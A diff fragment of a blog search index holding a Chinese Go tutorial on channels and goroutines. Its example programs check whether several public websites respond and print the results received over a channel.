+<h3 id="通道的创建"><a href="#通道的创建" class="headerlink" title="通道的创建"></a>通道的创建</h3><p>实现字符串类型</p>
+<h3 id="通道的实例"><a href="#通道的实例" class="headerlink" title="通道的实例"></a>通道的实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	links := []string&#123;</span><br><span class="line">		&quot;https://www.baidu.com&quot;,</span><br><span class="line">		&quot;https://www.jd.com&quot;,</span><br><span class="line">		&quot;https://www.taobao.com&quot;,</span><br><span class="line">		&quot;https://www.sohu.com&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c := make(chan string)</span><br><span class="line"></span><br><span class="line">	for _, link := range links &#123;</span><br><span class="line">		go checkLink(link, c)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(&lt;-c) // 等到通道并且打印</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkLink(link string, c chan string) &#123;</span><br><span class="line"></span><br><span class="line">	_, err := http.Get(link)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Printf(link, &quot;连接失效&quot;)</span><br><span class="line">		c &lt;- &quot;连接失效&quot; // 为了通道传递消息</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c &lt;- &quot;连接上了&quot;</span><br><span class="line">	fmt.Println(link, &quot;连接上了&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>输出结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.jd.com 连接上了</span><br><span class="line">连接上了</span><br></pre></td></tr></table></figure>
+<p>开始主协程陷入等待，子协程打印之后，主协程退出，其他协程也退出。</p>
+<p>如果想要全部打印出来，就需要增加多个等待通道的指令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	links := []string&#123;</span><br><span class="line">		&quot;https://www.baidu.com&quot;,</span><br><span class="line">		&quot;https://www.jd.com&quot;,</span><br><span class="line">		&quot;https://www.taobao.com&quot;,</span><br><span class="line">		&quot;https://www.sohu.com&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c := make(chan string)</span><br><span class="line"></span><br><span class="line">	for _, link := range links &#123;</span><br><span class="line">		go checkLink(link, c)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for i := 0; i &lt; len(links); i++ &#123;</span><br><span class="line">		fmt.Println(&lt;-c)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkLink(link string, c chan string) &#123;</span><br><span class="line"></span><br><span class="line">	_, err := http.Get(link)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Printf(link, &quot;连接失效&quot;)</span><br><span class="line">		c &lt;- &quot;连接失效&quot; // 为了通道传递消息</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c &lt;- &quot;连接上了&quot;</span><br><span class="line">	fmt.Println(link, &quot;连接上了&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>golang</tag>
       </tags>
   </entry>
 </search>
